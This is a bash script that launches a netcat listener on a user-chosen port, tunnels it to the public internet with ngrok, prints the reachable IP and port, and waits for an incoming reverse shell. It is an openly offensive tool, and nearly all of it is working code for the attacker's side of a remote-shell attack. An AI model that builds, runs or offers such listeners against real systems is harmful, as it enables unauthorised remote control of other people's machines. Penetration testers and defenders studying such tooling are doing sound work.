#!/bin/bash

# Function to kill ngrok process and netcat listener
function kill_ngrok {
    pkill -P $$ # Kill all child processes
    exit 0
}

# Get user input for port number
echo -e "\e[1mEnter port number:\e[0m"
read port

# Start netcat listener on specified port using selected terminal emulator
echo -e "\e[1mStarting netcat listener on port \e[32m$port\e[0m"
echo -e "\e[1mSelect terminal emulator to use:\e[0m"
echo -e "\e[1m[1] Konsole\e[0m"
echo -e "\e[1m[2] GNOME Terminal\e[0m"
echo -e "\e[1m[3] xterm\e[0m"
read choice

case $choice in
    1)
        konsole -e "nc -lvp $port" &
        ;;
    2)
        gnome-terminal -- nc -lvp $port &
        ;;
    3)
        xterm -e "nc -lvp $port" &
        ;;
    *)
        echo -e "\e[31mInvalid choice. Exiting...\e[0m"
        exit 1
        ;;
esac

# Create ngrok TCP server on the same port
echo -e "\e[1mTCP tunneling using ngrok to port \e[32m$port\e[0m"
ngrok tcp $port --log=stdout >/dev/null & disown

# Set trap to kill ngrok and netcat processes when script receives SIGINT signal
trap kill_ngrok SIGINT

# Wait for ngrok to start and get the TCP IP port
while true; do
    ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ $ngrok_url == *"tcp://"* ]]; then
        tcp_port=${ngrok_url#*tcp://}
        ngrok_domain=${ngrok_url#*//}
        ngrok_domain=${ngrok_domain%%:*}
        ngrok_ip=$(dig +short $ngrok_domain)
        echo -e "\e[1mAccess the listener from the WAN using TCP IP address: \e[32m$ngrok_ip\e[0m, address+port: \e[32m$tcp_port\e[0m"
        break
    fi
    sleep 1
done

# Wait for netcat connection to be established and then kill ngrok and netcat processes
while true; do
    if netstat -ant | grep -q $port && ! pgrep -x nc > /dev/null; then
        echo -e "\e[1mReverse shell connection established. Exiting...\e[0m"
        break
    fi
    sleep 1
done

# Kill ngrok and netcat processes
pkill ngrok
pkill -P $$ 
exit 0
